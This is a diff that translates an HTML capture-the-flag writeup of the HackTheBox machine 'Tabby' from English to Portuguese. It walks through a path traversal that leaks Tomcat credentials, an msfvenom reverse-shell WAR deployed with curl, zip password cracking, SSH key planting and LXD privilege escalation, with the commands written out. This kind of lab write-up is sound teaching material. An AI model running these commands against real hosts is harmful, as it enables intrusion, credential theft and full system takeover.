@@ -1,33 +1,33 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-BR">
   <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>tabby — htb writeup · chu@antisec</title>
-    <meta name="description" content="htb tabby — path traversal to tomcat-users.xml, war deploy on the manager, zip2john on the backup and privesc via lxd.">
+    <title>tabby — writeup htb · chu@antisec</title>
+    <meta name="description" content="htb tabby — path traversal até tomcat-users.xml, deploy de war no manager, zip2john no backup e privesc via lxd.">
     <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Crect width='16' height='16' fill='%23080b09'/%3E%3Crect x='3' y='3' width='6' height='10' fill='%235df27f'/%3E%3C/svg%3E">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,400;0,500;0,600;1,400&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="../styles.css">
-    <link rel="alternate" hreflang="pt-BR" href="../pt/hackthebox/tabby.html">
-    <link rel="alternate" hreflang="en" href="tabby.html">
-    <link rel="alternate" hreflang="x-default" href="tabby.html">
+    <link rel="stylesheet" href="../../styles.css">
+    <link rel="alternate" hreflang="pt-BR" href="tabby.html">
+    <link rel="alternate" hreflang="en" href="../../hackthebox/tabby.html">
+    <link rel="alternate" hreflang="x-default" href="../../hackthebox/tabby.html">
   </head>
   <body>
-    <a class="skip" href="#main">skip to content</a>
+    <a class="skip" href="#main">pular para o conteúdo</a>
 
     <header class="chrome">
       <div class="wrap chrome-in">
-        <a class="brand" href="../index.html">chu<span class="host">@antisec</span>:~/htb$<span class="cursor" aria-hidden="true">▌</span></a>
-        <nav class="nav" aria-label="main">
+        <a class="brand" href="../../index.html">chu<span class="host">@antisec</span>:~/htb$<span class="cursor" aria-hidden="true">▌</span></a>
+        <nav class="nav" aria-label="principal">
           <ul>
-            <li><a href="../index.html">home</a></li>
-            <li><a href="../research/index.html">research</a></li>
+            <li><a href="../../index.html">início</a></li>
+            <li><a href="../index.html">pesquisa</a></li>
             <li><a href="index.html" aria-current="page">writeups</a></li>
-            <li><a href="../about.html">about</a></li>
-            <li><a href="https://adminions.ca/" target="_blank" rel="noopener">team</a></li>
-            <li class="lang"><a href="../pt/hackthebox/tabby.html" hreflang="pt-BR" lang="pt-BR" title="versão em português" aria-label="mudar para português"><svg viewBox="0 0 24 16" aria-hidden="true" focusable="false"><rect width="24" height="16" fill="#009b3a"/><path d="M12 1.6 22.4 8 12 14.4 1.6 8Z" fill="#fedf00"/><circle cx="12" cy="8" r="3.1" fill="#002776"/></svg></a><span class="flag-cur" aria-hidden="true"><svg viewBox="0 0 24 16" aria-hidden="true" focusable="false"><rect width="24" height="16" fill="#012169"/><path d="M0 0L24 16M24 0L0 16" stroke="#fff" stroke-width="3.2"/><path d="M0 0L24 16M24 0L0 16" stroke="#C8102E" stroke-width="1.6"/><path d="M12 0V16M0 8H24" stroke="#fff" stroke-width="5"/><path d="M12 0V16M0 8H24" stroke="#C8102E" stroke-width="2.8"/></svg></span></li>
+            <li><a href="../about.html">sobre</a></li>
+            <li><a href="https://adminions.ca/" target="_blank" rel="noopener">time</a></li>
+            <li class="lang"><span class="flag-cur"><svg viewBox="0 0 24 16" aria-hidden="true" focusable="false"><rect width="24" height="16" fill="#009b3a"/><path d="M12 1.6 22.4 8 12 14.4 1.6 8Z" fill="#fedf00"/><circle cx="12" cy="8" r="3.1" fill="#002776"/></svg></span><a href="../../hackthebox/tabby.html" hreflang="en" lang="en" title="read in english" aria-label="switch to english"><svg viewBox="0 0 24 16" aria-hidden="true" focusable="false"><rect width="24" height="16" fill="#012169"/><path d="M0 0L24 16M24 0L0 16" stroke="#fff" stroke-width="3.2"/><path d="M0 0L24 16M24 0L0 16" stroke="#C8102E" stroke-width="1.6"/><path d="M12 0V16M0 8H24" stroke="#fff" stroke-width="5"/><path d="M12 0V16M0 8H24" stroke="#C8102E" stroke-width="2.8"/></svg></a></li>
           </ul>
         </nav>
       </div>
@@ -47,7 +47,7 @@
           <li class="chip">date=2025-07-12</li>
           <li class="chip">os=linux</li>
           <li class="chip">ip=10.10.10.194</li>
-          <li class="chip">lang=en</li>
+          <li class="chip">lang=pt-br</li>
           <li class="chip chip--phos">status=root</li>
         </ul>
 
@@ -60,7 +60,7 @@
           </figure>
 
           <p class="cmd"><span class="ps1"><b>chu@antisec</b>:~/htb$</span> cat tools.txt</p>
-          <p><strong>Tools</strong> used:</p>
+          <p><strong>Tools</strong> utilizadas:</p>
           <ul class="chips">
             <li class="chip">nmap</li>
             <li class="chip">BurpSuite</li>
@@ -69,7 +69,7 @@
             <li class="chip">John the Ripper/zip2john</li>
           </ul>
 
-          <p>Starting with nmap to look for ports and services running on our target:</p>
+          <p>Iniciando com o nmap para procurar por portas e serviços rodando em nosso alvo:</p>
 
           <div class="code">
             <div class="code-cap"><span class="dot" aria-hidden="true">●</span> nmap</div>
@@ -111,11 +111,11 @@ HOP RTT       ADDRESS
 2   157.21 ms 10.10.10.194</code></pre>
           </div>
 
-          <p>Let's start with the web service on port 80 http</p>
+          <p>Vamos começar pelo serviço web da porta 80 http</p>
 
           <figure class="fig">
-            <img src="https://i.imgur.com/CMz6njp.png" alt="Let's start with the web service on port 80 http" loading="lazy">
-            <figcaption class="fig-cap">Let's start with the web service on port 80 http</figcaption>
+            <img src="https://i.imgur.com/CMz6njp.png" alt="Vamos começar pelo serviço web da porta 80 http" loading="lazy">
+            <figcaption class="fig-cap">Vamos começar pelo serviço web da porta 80 http</figcaption>
           </figure>
 
           <div class="code">
@@ -123,11 +123,11 @@ HOP RTT       ADDRESS
             <pre><code>http://megahosting.htb/news.php?file=statement</code></pre>
         </div>
 
-        <p>Accessing the web page, we can see the 'INFRASTRUCTURE' tab shows a link to megahosting.htb, so we need to add it to the /etc/hosts file.</p>
+        <p>Ao acessar a página web, podemos ver que na aba 'INFRASTRUCTURE' nos mostra um link para megahosting.htb , portanto, precisamos adiciona-lo no arquivo /etc/hosts.</p>
 
         <figure class="fig">
-          <img src="https://i.imgur.com/hvhe3st.png" alt="Accessing the web page, we can see the &#x27;INFRASTRUCTURE&#x27; tab shows a link to…" loading="lazy">
-          <figcaption class="fig-cap">Accessing the web page, we can see the 'INFRASTRUCTURE' tab shows a link to…</figcaption>
+          <img src="https://i.imgur.com/hvhe3st.png" alt="Ao acessar a página web, podemos ver que na aba &#x27;INFRASTRUCTURE&#x27; nos mostra um link para…" loading="lazy">
+          <figcaption class="fig-cap">Ao acessar a página web, podemos ver que na aba 'INFRASTRUCTURE' nos mostra um link para…</figcaption>
         </figure>
 
         <div class="code">
@@ -158,20 +158,20 @@ ash</code></pre>
       <figcaption class="fig-cap">root</figcaption>
     </figure>
 
-    <p>Let's take a look at what we found on the other web service, on port 8080. <a href="http://megahosting.htb:8080/">http://megahosting.htb:8080/</a></p>
+    <p>Vamos dar uma olhada no que encontramos no outro serviço Web, na porta 8080. <a href="http://megahosting.htb:8080/">http://megahosting.htb:8080/</a></p>
 
-    <p>Accessing the page, we saw it's a default one, but it hands us a very useful piece of information</p>
+    <p>Ao acessar a pagina, vimos que é uma página default mas nos tras uma informação muito útil</p>
 
-    <p>The message gives us the full path to a users file: /usr/share/tomcat9/etc/tomcat-users.xml</p>
+    <p>A mensagem nos passa o caminho completo para um arquivo de usuários: /usr/share/tomcat9/etc/tomcat-users.xml</p>
 
-    <p>Let's head over to BurpSuite and use Repeater to work the Path Traversal more comfortably:</p>
+    <p>Vamos para o BurpSuite usando o Repeater para melhor interagir com o Path Transversal:</p>
 
     <figure class="fig">
-      <img src="https://i.imgur.com/PkxZjwq.png" alt="Let's head over to BurpSuite and use Repeater to work the Path Traversal more comfortably" loading="lazy">
-      <figcaption class="fig-cap">Let's head over to BurpSuite and use Repeater to work the Path Traversal more comfortably</figcaption>
+      <img src="https://i.imgur.com/PkxZjwq.png" alt="Vamos para o BurpSuite usando o Repeater para melhor interagir com o Path Transversal" loading="lazy">
+      <figcaption class="fig-cap">Vamos para o BurpSuite usando o Repeater para melhor interagir com o Path Transversal</figcaption>
     </figure>
 
-    <p>Our request:</p>
+    <p>Nossa requisição:</p>
 
     <div class="code">
       <div class="code-cap"><span class="dot" aria-hidden="true">●</span> http</div>
@@ -185,7 +185,7 @@ Connection: close
 Upgrade-Insecure-Requests: 1</code></pre>
     </div>
 
-    <p>The response to our request, containing the tomcat user and its password.</p>
+    <p>A resposta da nossa requisição, contendo o usuário tomcat e sua senha.</p>
 
     <div class="code">
       <div class="code-cap"><span class="dot" aria-hidden="true">●</span> http</div>
@@ -253,13 +253,13 @@ Content-Type: text/html; charset=UTF-8
 
   <p>tomcat : $3cureP4s5w0rd123!</p>
 
-  <p>Let's try uploading a shell now that we have a credential.</p>
+  <p>Vamos tentar fazer um upload de uma shell agora que possuimos uma credencial.</p>
 
-  <p>First let's build a WAR-format shell using metasploit:</p>
+  <p>Primeiro vamos criar uma shell do formato WAR usando o metasploit:</p>
 
   <figure class="fig">
-    <img src="https://i.imgur.com/40AuMwa.png" alt="First let's build a WAR-format shell using metasploit" loading="lazy">
-    <figcaption class="fig-cap">First let's build a WAR-format shell using metasploit</figcaption>
+    <img src="https://i.imgur.com/40AuMwa.png" alt="Primeiro vamos criar uma shell do formato WAR usando o metasploit" loading="lazy">
+    <figcaption class="fig-cap">Primeiro vamos criar uma shell do formato WAR usando o metasploit</figcaption>
   </figure>
 
   <div class="code">
@@ -267,11 +267,11 @@ Content-Type: text/html; charset=UTF-8
     <pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.15.86" LPORT=1337 -f war &gt; shell.war</code></pre>
 </div>
 
-<p>Now that we have our shell built, let's upload it using curl:</p>
+<p>Agora que já temos a nossa shell criada, vamos fazer o upload utilizando o curl:</p>
 
 <figure class="fig">
-  <img src="https://i.imgur.com/0Ija6Yi.png" alt="Now that we have our shell built, let's upload it using curl" loading="lazy">
-  <figcaption class="fig-cap">Now that we have our shell built, let's upload it using curl</figcaption>
+  <img src="https://i.imgur.com/0Ija6Yi.png" alt="Agora que já temos a nossa shell criada, vamos fazer o upload utilizando o curl" loading="lazy">
+  <figcaption class="fig-cap">Agora que já temos a nossa shell criada, vamos fazer o upload utilizando o curl</figcaption>
 </figure>
 
 <div class="code">
@@ -279,33 +279,33 @@ Content-Type: text/html; charset=UTF-8
   <pre><code>curl --user 'tomcat:$3cureP4s5w0rd123!' --upload-file shell.war "http://megahosting.htb:8080/manager/text/deploy?path=/chu.war"  </code></pre>
 </div>
 
-<p>The site's response telling us the upload worked :D</p>
+<p>A resposta do site nos dizendo que o upload funcionou :D</p>
 
 <p>OK - Deployed application at context path [/chu.war]</p>
 
-<p>Now let's move to metasploit</p>
+<p>Agora vamos ao metasploit</p>
 
-<p>We'll use the handler (exploit/mult/handler)</p>
+<p>Vamos utilizar o handler (exploit/mult/handler)</p>
 
 <figure class="fig">
-  <img src="https://i.imgur.com/MwXXX3p.png" alt="We'll use the handler (exploit/mult/handler)" loading="lazy">
-  <figcaption class="fig-cap">We'll use the handler (exploit/mult/handler)</figcaption>
+  <img src="https://i.imgur.com/MwXXX3p.png" alt="Vamos utilizar o handler (exploit/mult/handler)" loading="lazy">
+  <figcaption class="fig-cap">Vamos utilizar o handler (exploit/mult/handler)</figcaption>
 </figure>
 
-<p>After selecting it, set your IP and the port meant to receive the Shell:</p>
+<p>Após seleciona-lo, setar o seu IP e a porta destinada para receber a Shell:</p>
 
 <figure class="fig">
-  <img src="https://i.imgur.com/vSglXbJ.png" alt="After selecting it, set your IP and the port meant to receive the Shell" loading="lazy">
-  <figcaption class="fig-cap">After selecting it, set your IP and the port meant to receive the Shell</figcaption>
+  <img src="https://i.imgur.com/vSglXbJ.png" alt="Após seleciona-lo, setar o seu IP e a porta destinada para receber a Shell" loading="lazy">
+  <figcaption class="fig-cap">Após seleciona-lo, setar o seu IP e a porta destinada para receber a Shell</figcaption>
 </figure>
 
-<p>Accessing the page with our file, we get the connection: <a href="http://megahosting.htb:8080/chu.war">http://megahosting.htb:8080/chu.war</a></p>
+<p>Ao acessar a página com nosso arquivo, recebemos a conexão: <a href="http://megahosting.htb:8080/chu.war">http://megahosting.htb:8080/chu.war</a></p>
 
-<p>We're the tomcat user</p>
+<p>Estamos como usuario tomcat</p>
 
 <figure class="fig">
-  <img src="https://i.imgur.com/g1QqPdq.png" alt="We're the tomcat user" loading="lazy">
-  <figcaption class="fig-cap">We're the tomcat user</figcaption>
+  <img src="https://i.imgur.com/g1QqPdq.png" alt="Estamos como usuario tomcat" loading="lazy">
+  <figcaption class="fig-cap">Estamos como usuario tomcat</figcaption>
 </figure>
 
 <div class="code">
@@ -313,11 +313,11 @@ Content-Type: text/html; charset=UTF-8
   <pre><code>uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)</code></pre>
 </div>
 
-<p>Upgrading our shell using Python3</p>
+<p>Melhorando a nossa shell utilizando Python3</p>
 
 <figure class="fig">
-  <img src="https://i.imgur.com/O9VqEev.png" alt="Upgrading our shell using Python3" loading="lazy">
-  <figcaption class="fig-cap">Upgrading our shell using Python3</figcaption>
+  <img src="https://i.imgur.com/O9VqEev.png" alt="Melhorando a nossa shell utilizando Python3" loading="lazy">
+  <figcaption class="fig-cap">Melhorando a nossa shell utilizando Python3</figcaption>
 </figure>
 
 <div class="code">
@@ -325,11 +325,11 @@ Content-Type: text/html; charset=UTF-8
   <pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
 </div>
 
-<p>While looking for files in the default web server folder, we find a file named: 16162020_backup.zip</p>
+<p>Ao procurar por arquivos na pasta do servidor web padrão, encontramos um arquivo nomeado como: 16162020_backup.zip</p>
 
 <figure class="fig">
-  <img src="https://i.imgur.com/c371MR7.png" alt="Looking for files in the default web server folder, we find a file named…" loading="lazy">
-  <figcaption class="fig-cap">Looking for files in the default web server folder, we find a file named…</figcaption>
+  <img src="https://i.imgur.com/c371MR7.png" alt="Ao procurar por arquivos na pasta do servidor web padrão, encontramos um arquivo nomeado como:…" loading="lazy">
+  <figcaption class="fig-cap">Ao procurar por arquivos na pasta do servidor web padrão, encontramos um arquivo nomeado como:…</figcaption>
 </figure>
 
 <div class="code">
@@ -337,25 +337,25 @@ Content-Type: text/html; charset=UTF-8
   <pre><code>/var/www/html/files/16162020_backup.zip</code></pre>
 </div>
 
-<p>Let's download it to take a look:</p>
+<p>Vamos fazer o download para analisá-lo:</p>
 
 <figure class="fig">
-  <img src="https://i.imgur.com/q15qgNp.png" alt="Let's download it to take a look" loading="lazy">
-  <figcaption class="fig-cap">Let's download it to take a look</figcaption>
+  <img src="https://i.imgur.com/q15qgNp.png" alt="Vamos fazer o download para analisá-lo" loading="lazy">
+  <figcaption class="fig-cap">Vamos fazer o download para analisá-lo</figcaption>
 </figure>
 
-<p>The backup file is protected by a password...</p>
+<p>O arquivo de backup está protegido por uma senha...</p>
 
 <figure class="fig">
-  <img src="https://i.imgur.com/HXGfBuL.png" alt="The backup file is protected by a password..." loading="lazy">
-  <figcaption class="fig-cap">The backup file is protected by a password...</figcaption>
+  <img src="https://i.imgur.com/HXGfBuL.png" alt="O arquivo de backup está protegido por uma senha..." loading="lazy">
+  <figcaption class="fig-cap">O arquivo de backup está protegido por uma senha...</figcaption>
 </figure>
 
-<p>Let's crack it with John the Ripper, this time zip2john</p>
+<p>Vamos quebra-lá utilizando o John the Ripper, desta vez o zip2john</p>
 
 <figure class="fig">
-  <img src="https://i.imgur.com/luHWLdc.png" alt="Let's crack it with John the Ripper, this time zip2john" loading="lazy">
-  <figcaption class="fig-cap">Let's crack it with John the Ripper, this time zip2john</figcaption>
+  <img src="https://i.imgur.com/luHWLdc.png" alt="Vamos quebra-lá utilizando o John the Ripper, desta vez o zip2john" loading="lazy">
+  <figcaption class="fig-cap">Vamos quebra-lá utilizando o John the Ripper, desta vez o zip2john</figcaption>
 </figure>
 
 <div class="code">
@@ -363,18 +363,18 @@ Content-Type: text/html; charset=UTF-8
   <pre><code>zip2john 16162020_backup.zip &gt;&gt; hash.txt</code></pre>
 </div>
 
-<p>Now we have the hash of the .zip file's password</p>
+<p>Agora possuimos a hash da senha do arquivo .zip</p>
 
 <figure class="fig">
-  <img src="https://i.imgur.com/PLv7TCk.png" alt="Now we have the hash of the .zip file's password" loading="lazy">
-  <figcaption class="fig-cap">Now we have the hash of the .zip file's password</figcaption>
+  <img src="https://i.imgur.com/PLv7TCk.png" alt="Agora possuimos a hash da senha do arquivo .zip" loading="lazy">
+  <figcaption class="fig-cap">Agora possuimos a hash da senha do arquivo .zip</figcaption>
 </figure>
 
-<p>So now we have to crack it, using John</p>
+<p>Portanto devemos quebra-la, utilizando o John</p>
 
 <figure class="fig">
-  <img src="https://i.imgur.com/VicZnFZ.png" alt="So now we have to crack it, using John" loading="lazy">
-  <figcaption class="fig-cap">So now we have to crack it, using John</figcaption>
+  <img src="https://i.imgur.com/VicZnFZ.png" alt="Portanto devemos quebra-la, utilizando o John" loading="lazy">
+  <figcaption class="fig-cap">Portanto devemos quebra-la, utilizando o John</figcaption>
 </figure>
 
 <div class="code">
@@ -387,14 +387,14 @@ Content-Type: text/html; charset=UTF-8
   <figcaption class="fig-cap">john --wordlist=../rockyou.txt hash.txt</figcaption>
 </figure>
 
-<p>Now we can finally peek inside the backup!</p>
+<p>Agora já podemos conferir o backup!</p>
 
 <div class="code">
   <div class="code-cap"><span class="dot" aria-hidden="true">●</span> creds</div>
   <pre><code>16162020_backup.zip:admin@it</code></pre>
 </div>
 
-<p>Going through the backup, I couldn't find anything useful to move forward with... Just when I was starting to think it was a rabbit hole, I decided to give the password I had gotten a shot...</p>
+<p>Ao analisar o backup encontrado, não fui capaz de encontrar nada de útil para prosseguir... Quando eu já estava achando que era uma toca de coelho, resolvi fazer um teste com a senha que tinha obtido...</p>
 
 <div class="code">
   <div class="code-cap"><span class="dot" aria-hidden="true">●</span> shell</div>
@@ -413,18 +413,18 @@ Content-Type: text/html; charset=UTF-8
 
 <p>lol xD</p>
 
-<p>Upgrading our shell: when connecting as the Ash user, who has SSH login enabled, we insert our freshly generated ssh-keygen key</p>
+<p>Melhorando a nossa shell: Ao se conectar no usuário Ash, que possui login SSH ativo, inserimos nossa chave rescém criada através do ssh-keygen</p>
 
 <figure class="fig">
-  <img src="https://i.imgur.com/3x6WSRe.png" alt="Upgrading our shell: when connecting as the Ash user, who has SSH login enabled, we insert…" loading="lazy">
-  <figcaption class="fig-cap">Upgrading our shell: when connecting as the Ash user, who has SSH login enabled, we insert…</figcaption>
+  <img src="https://i.imgur.com/3x6WSRe.png" alt="Melhorando a nossa shell: Ao se conectar no usuário Ash, que possui login SSH ativo, inserimos…" loading="lazy">
+  <figcaption class="fig-cap">Melhorando a nossa shell: Ao se conectar no usuário Ash, que possui login SSH ativo, inserimos…</figcaption>
 </figure>
 
-<p>Now let's write it to the authorization file:</p>
+<p>Agora vamos escreve-la no arquivo de autorização:</p>
 
 <figure class="fig">
-  <img src="https://i.imgur.com/J2juZeX.png" alt="Now let's write it to the authorization file" loading="lazy">
-  <figcaption class="fig-cap">Now let's write it to the authorization file</figcaption>
+  <img src="https://i.imgur.com/J2juZeX.png" alt="Agora vamos escreve-la no arquivo de autorização" loading="lazy">
+  <figcaption class="fig-cap">Agora vamos escreve-la no arquivo de autorização</figcaption>
 </figure>
 
 <div class="code">
@@ -442,25 +442,25 @@ Content-Type: text/html; charset=UTF-8
   <figcaption class="fig-cap">ssh ash@10.10.10.194 -i tabby</figcaption>
 </figure>
 
-<p>Grabbing the user flag. (user.txt)</p>
+<p>Pegando a flag de user. (user.txt)</p>
 
 <figure class="fig">
-  <img src="https://i.imgur.com/BZkzUtS.png" alt="Grabbing the user flag. (user.txt)" loading="lazy">
-  <figcaption class="fig-cap">Grabbing the user flag. (user.txt)</figcaption>
+  <img src="https://i.imgur.com/BZkzUtS.png" alt="Pegando a flag de user. (user.txt)" loading="lazy">
+  <figcaption class="fig-cap">Pegando a flag de user. (user.txt)</figcaption>
 </figure>
 
-<p><strong>Privilege Escalation.</strong></p>
+<p><strong>Escalação de Privilégio.</strong></p>
 
-<p>Once logged in as the ash user, the id command shows we're part of an interesting group...</p>
+<p>Ao logar no usuário ash, usando o comando id, podemos perceber que fazemos parte de um grupo interessante...</p>
 
 <figure class="fig">
-  <img src="https://i.imgur.com/RjhcBjl.png" alt="Once logged in as the ash user, the id command shows we're part of an interesting group…" loading="lazy">
-  <figcaption class="fig-cap">Once logged in as the ash user, the id command shows we're part of an interesting group…</figcaption>
+  <img src="https://i.imgur.com/RjhcBjl.png" alt="Ao logar no usuário ash, usando o comando id, podemos perceber que fazemos parte de um grupo…" loading="lazy">
+  <figcaption class="fig-cap">Ao logar no usuário ash, usando o comando id, podemos perceber que fazemos parte de um grupo…</figcaption>
 </figure>
 
-<p>The Hacking Articles article gives us a good hint: <a href="https://www.hackingarticles.in/lxd-privilege-escalation/">link</a></p>
+<p>O artigo do Hacking Articles, nos dá uma boa pista: <a href="https://www.hackingarticles.in/lxd-privilege-escalation/">link</a></p>
 
-<p>On our local machine we'll build the image that will be imported on the target:</p>
+<p>Em nossa máquina local criaremos a imagem que será importada no alvo:</p>
 
 <div class="code">
   <div class="code-cap"><span class="dot" aria-hidden="true">●</span> shell</div>
@@ -469,11 +469,11 @@ cd lxd-alpine-builder
 ./build-alpine</code></pre>
 </div>
 
-<p>We use a Python HTTP server module to host it:</p>
+<p>Utilizamos um módulo de servidor HTTP do Python para hospedar:</p>
 
 <figure class="fig">
-  <img src="https://i.imgur.com/3egnXWH.png" alt="We use a Python HTTP server module to host it" loading="lazy">
-  <figcaption class="fig-cap">We use a Python HTTP server module to host it</figcaption>
+  <img src="https://i.imgur.com/3egnXWH.png" alt="Utilizamos um módulo de servidor HTTP do Python para hospedar" loading="lazy">
+  <figcaption class="fig-cap">Utilizamos um módulo de servidor HTTP do Python para hospedar</figcaption>
 </figure>
 
 <div class="code">
@@ -481,11 +481,11 @@ cd lxd-alpine-builder
   <pre><code>python -m SimpleHTTPServer 80 </code></pre>
 </div>
 
-<p>After building it we have to send it over, and since we already have a shell, let's use wget:</p>
+<p>Após cria-la, devemos envia-lá, e como já possuimos shell, vamos usar o wget:</p>
 
 <figure class="fig">
-  <img src="https://i.imgur.com/nFP28IH.png" alt="After building it we have to send it over, and since we already have a shell, let's use wget" loading="lazy">
-  <figcaption class="fig-cap">After building it we have to send it over, and since we already have a shell, let's use wget</figcaption>
+  <img src="https://i.imgur.com/nFP28IH.png" alt="Após cria-la, devemos envia-lá, e como já possuimos shell, vamos usar o wget" loading="lazy">
+  <figcaption class="fig-cap">Após cria-la, devemos envia-lá, e como já possuimos shell, vamos usar o wget</figcaption>
 </figure>
 
 <div class="code">
@@ -493,7 +493,7 @@ cd lxd-alpine-builder
   <pre><code>wget 10.10.15.85/alpine-v3.12-x86_64-20201026_2224.tar.gz</code></pre>
 </div>
 
-<p>To import the image we use the command:</p>
+<p>Para importar a imagem utilizamos o comando:</p>
 
 <div class="code">
   <div class="code-cap"><span class="dot" aria-hidden="true">●</span> shell</div>
@@ -506,11 +506,11 @@ ash@tabby:/tmp$ lxc image list </code></pre>
   <figcaption class="fig-cap">ash@tabby:/tmp$ lxc image import ./alpine-v3.12-x86_64-20200626_1413.tar.gz --alias chu</figcaption>
 </figure>
 
-<p>We can see the image is already there, now we need to use it</p>
+<p>Podemos ver que a imagem já está lá, agora precisamos usa-la</p>
 
 <figure class="fig">
-  <img src="https://i.imgur.com/JWjGIxc.png" alt="We can see the image is already there, now we need to use it" loading="lazy">
-  <figcaption class="fig-cap">We can see the image is already there, now we need to use it</figcaption>
+  <img src="https://i.imgur.com/JWjGIxc.png" alt="Podemos ver que a imagem já está lá, agora precisamos usa-la" loading="lazy">
+  <figcaption class="fig-cap">Podemos ver que a imagem já está lá, agora precisamos usa-la</figcaption>
 </figure>
 
 <div class="code">
@@ -567,7 +567,7 @@ https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/</code></
 <nav class="post-nav" aria-label="writeup navigation">
   <span>← prev:</span><a href="forge.html">forge</a>
   <span>next →</span><a href="coder.html">coder</a>
-  <span>·</span><a href="index.html">all writeups</a>
+  <span>·</span><a href="index.html">todas as writeups</a>
 </nav>
 
 </article>
@@ -579,10 +579,10 @@ https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/</code></
       <p>chu@antisec — long life for the hacking and the cats!<span aria-hidden="true"></span></p>
     </div>
     <div class="foot-row">
-      <p>← <a href="index.html">writeups</a> · <a href="../about.html">about</a> · <a href="../about.html#contact">contact</a></p>
+      <p>← <a href="index.html">writeups</a> · <a href="../about.html">sobre</a> · <a href="../about.html#contact">contato</a></p>
     </div>
   </div>
 </footer>
-<script src="../zoom.js" defer></script>
+<script src="../../zoom.js" defer></script>
 </body>
 </html>
